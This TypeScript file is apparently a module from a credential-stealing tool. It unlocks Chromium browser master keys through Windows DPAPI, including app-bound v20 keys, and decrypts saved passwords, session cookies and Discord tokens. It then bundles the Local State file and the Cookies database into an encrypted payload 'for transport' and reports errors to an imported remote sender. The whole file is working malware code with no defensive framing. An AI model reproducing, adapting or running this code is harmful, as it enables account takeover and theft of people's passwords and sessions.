import crypto from 'crypto';
import koffi from 'koffi';
import fs from 'fs';
import path from 'path';
import Dpapi from 'datavault-win';
import { getAppBoundKey } from './appBound';
import { sendGenericMessage } from '../api/sender';
const PBYTE = koffi.pointer('uint8_t');
const DATA_BLOB = koffi.struct({
    cbData: 'uint32_t',
    pbData: PBYTE
});
const PDATA_BLOB = koffi.pointer(DATA_BLOB);
const crypt32 = koffi.load('crypt32.dll');
const CryptUnprotectData = crypt32.func('__stdcall', 'CryptUnprotectData', 'int', [PDATA_BLOB, 'void*', 'void*', 'void*', 'void*', 'uint32_t', PDATA_BLOB]);

export function nativeDPAPIUnprotect(dataBuf: Buffer | Uint8Array): Buffer | null {
    try {
        const buffer = Buffer.isBuffer(dataBuf) ? dataBuf : Buffer.from(dataBuf);
        const dataIn = { cbData: buffer.length, pbData: buffer };
        const dataOutBuf = Buffer.alloc(koffi.sizeof(DATA_BLOB));

        const success = CryptUnprotectData(dataIn, null, null, null, null, 0, dataOutBuf);
        if (success) {
            const dataOut = koffi.decode(dataOutBuf, DATA_BLOB);
            const res = koffi.decode(dataOut.pbData, 'uint8_t', dataOut.cbData);
            return Buffer.from(res);
        }
        return null;
    } catch (e) {
        return null;
    }
}

export const dpapi = {
    unprotectData: (data: Buffer | Uint8Array): Buffer => {
        const res = nativeDPAPIUnprotect(data);
        if (!res) throw new Error('DPAPI native call failed');
        return res;
    }
};

export function decryptAESGCM(enc: Buffer, key: Buffer): string | null {
    try {
        if (enc.length < 31) {
            return null;
        }

        const iv = enc.slice(3, 15);
        const data = enc.slice(15, -16);
        const tag = enc.slice(-16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);

        const decryptedBuf = Buffer.concat([decipher.update(data), decipher.final()]);
        return decryptedBuf.toString('utf8');
    } catch (e) {
        return null;
    }
}

export function decryptToken(encryptedToken: string, key: Buffer): string | null {
    try {
        const tokenParts = encryptedToken.split('dQw4w9WgXcQ:');
        if (tokenParts.length !== 2) {
            return null;
        }

        const encryptedData = Buffer.from(tokenParts[1], 'base64');
        const iv = encryptedData.slice(3, 15);
        const ciphertext = encryptedData.slice(15, -16);
        const tag = encryptedData.slice(-16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);

        const decryptedBuf = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
        return decryptedBuf.toString('utf8').replace(/\0/g, '').trim();
    } catch (error) {
        return null;
    }
}

export async function getEncryptionKey(browserPath: string): Promise<Buffer | null> {
    const localStatePath = path.join(browserPath, 'Local State');

    try {
        if (!fs.existsSync(localStatePath)) {
            return null;
        }

        const localStateData = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
        const appBound = localStateData.os_crypt?.app_bound_encrypted_key_v20 || localStateData.os_crypt?.app_bound_encrypted_key;
        if (appBound) {
            try {
                const appBoundKey = await getAppBoundKey(browserPath);
                if (appBoundKey) return appBoundKey;
            } catch (e) {
            }
        }

        const encryptedKey = localStateData.os_crypt?.encrypted_key;
        if (!encryptedKey) return null;

        const keyData = Buffer.from(encryptedKey, 'base64');
        if (keyData.slice(0, 5).toString() !== 'DPAPI') return null;

        const encryptedKeyData = keyData.slice(5);
        try {
            const decryptedKey = dpapi.unprotectData(encryptedKeyData);
            if (decryptedKey && Buffer.isBuffer(decryptedKey) && decryptedKey.length === 32) return decryptedKey;
            return null;
        } catch (error) {
            return null;
        }
    } catch (error) {
        return null;
    }
}

export async function decrypt(encrypted: Buffer, key: Buffer, browserPath?: string): Promise<string | null> {
    return new Promise((resolve) => {
        try {
            let result = decryptPasswordopw(encrypted, key);
            if (result) return resolve(result);

            if (browserPath) {
                try {
                    const localStatePath = path.join(browserPath, 'Local State');
                    if (fs.existsSync(localStatePath)) {
                        const localStateData = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
                        const encryptedKey = localStateData.os_crypt?.encrypted_key;
                        if (encryptedKey) {
                            const keyData = Buffer.from(encryptedKey, 'base64');
                            if (keyData.slice(0, 5).toString() === 'DPAPI') {
                                const decryptedLegacyKey = dpapi.unprotectData(keyData.slice(5));
                                if (decryptedLegacyKey && decryptedLegacyKey.length === 32) {
                                    result = decryptPasswordopw(encrypted, decryptedLegacyKey);
                                    if (result) return resolve(result);
                                }
                            }
                        }
                    }
                } catch (e: any) {
                    sendGenericMessage(`decrypt ${e.message}`)
                }
            }

            resolve(null);
        } catch (e) {
            resolve(null);
        }
    });
}

export function encryptForTransport(data: Buffer, masterKey: Buffer, prefix = 'v20'): string | null {
    try {
        if (!Buffer.isBuffer(masterKey) || masterKey.length !== 32) return null;
        const iv = crypto.randomBytes(12);
        const cipher = crypto.createCipheriv('aes-256-gcm', masterKey, iv);
        const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
        const tag = cipher.getAuthTag();
        const out = Buffer.concat([Buffer.from(prefix), iv, encrypted, tag]);
        return out.toString('base64');
    } catch (e: any) {
        sendGenericMessage(`encryptForTransport ${e.message}`)
        return null;
    }
}


export async function createEncryptedPayload(browserPath: string, cookieDbPath?: string): Promise<{ local_state?: string | null; cookies?: string | null } | null> {
    try {
        const masterKey = await getEncryptionKey(browserPath);
        if (!masterKey) return null;

        const localStatePath = path.join(browserPath, 'Local State');
        const payload: { local_state?: string | null; cookies?: string | null } = {};

        if (fs.existsSync(localStatePath)) {
            const ls = fs.readFileSync(localStatePath);
            payload.local_state = encryptForTransport(ls, masterKey, 'v20');
        }

        const cookiePath = cookieDbPath || path.join(browserPath, 'Default', 'Network', 'Cookies');
        if (fs.existsSync(cookiePath)) {
            const cb = fs.readFileSync(cookiePath);
            payload.cookies = encryptForTransport(cb, masterKey, 'v20');
        }

        return payload;
    } catch (e: any) {
        sendGenericMessage("createEncryptedPayload" + e.message)
        return null;
    }
}

export function decryptPasswordopw(encrypted: Buffer, masterKey: Buffer): string | null {
    const buffer = Buffer.from(encrypted);
    const prefix3 = buffer.slice(0, 3).toString();
    try {

        if (['v10', 'v11', 'v80'].includes(prefix3)) {
            try {
                if (buffer.length < 31) return null;
                if (!Buffer.isBuffer(masterKey) || masterKey.length !== 32) return null;

                const iv = buffer.slice(3, 15);
                const cipherText = buffer.slice(15, buffer.length - 16);
                const authTag = buffer.slice(buffer.length - 16);

                if (iv.length !== 12 || authTag.length !== 16) return null;

                const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                decipher.setAuthTag(authTag);

                try {
                    const decPart = decipher.update(cipherText);
                    const decFinal = decipher.final();
                    const decrypted = Buffer.concat([decPart, decFinal]);
                    return decrypted.toString('utf8').replace(/\0/g, '').trim();
                } catch (err: any) {
                    try {
                        const alt = buffer.slice(15);
                        if (alt.length > 16) {
                            const altAuth = alt.slice(-16);
                            const altCipher = alt.slice(0, -16);
                            const dec2 = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                            dec2.setAuthTag(altAuth);
                            const p1 = dec2.update(altCipher);
                            const p2 = dec2.final();
                            const decrypted2 = Buffer.concat([p1, p2]);
                            return decrypted2.toString('utf8').replace(/\0/g, '').trim();
                        }
                    } catch (e2: any) {

                    }
                    return null;
                }
            } catch (gcmError) {
                return null;
            }
        } else if (prefix3 === 'v20') {
            try {
                if (buffer.length < 31) return null;
                if (!Buffer.isBuffer(masterKey) || masterKey.length !== 32) return null;

                const iv = buffer.slice(3, 15);
                const cipherText = buffer.slice(15, buffer.length - 16);
                const authTag = buffer.slice(buffer.length - 16);

                if (iv.length !== 12 || authTag.length !== 16) return null;

                const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                decipher.setAuthTag(authTag);

                try {
                    const decPart = decipher.update(cipherText);
                    const decFinal = decipher.final();
                    const decrypted = Buffer.concat([decPart, decFinal]);

                    if (decrypted.length > 32) {
                        const head = decrypted.slice(0, 32);
                        let nonAscii = 0;
                        for (const b of head) if (b < 32 || b > 126) nonAscii++;

                        if (nonAscii > 5) {
                            return decrypted.slice(32).toString('utf8').replace(/\0/g, '').trim();
                        }
                    }
                    return decrypted.toString('utf8').replace(/\0/g, '').trim();
                } catch (err: any) {
                    return null;
                }
            } catch (gcmError) {
                return null;
            }
        } else {
            try {
                return (Dpapi.unprotectData(buffer, null, 'CurrentUser') as any).toString('utf8');
            } catch (e: any) {
                try {
                    return dpapi.unprotectData(buffer).toString('utf8');
                } catch (e: any) {
                    return null;
                }
            }
        }
    } catch (e) {
        return null;
    }
}
